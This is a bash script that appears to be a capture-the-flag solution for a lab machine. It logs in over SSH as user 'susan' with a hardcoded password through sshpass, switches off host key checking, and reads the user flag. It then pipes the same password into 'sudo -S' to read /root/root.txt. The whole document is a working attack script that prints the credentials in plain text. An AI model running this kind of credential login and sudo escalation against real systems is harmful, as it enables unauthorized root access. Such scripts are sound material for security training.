#!/bin/bash

ssh_command() {
    local ip="$1"
    local command="$2"

    output=$(sshpass -p 'susan_nasus_413759210' ssh -o StrictHostKeyChecking=no susan@$ip "$command" 2>/dev/null)
    echo "$output"
}

read -p "Enter the IP address of the target machine: " TARGET_IP

user_flag=$(ssh_command "$TARGET_IP" 'cat /home/susan/user.txt')
root_flag=$(ssh_command "$TARGET_IP" 'echo "susan_nasus_413759210" | sudo -S cat /root/root.txt')

echo -e "\e[32m[User-Flag]\e[34m[$user_flag]"
echo -e "\e[31m[Root-Flag]\e[34m[$root_flag]"
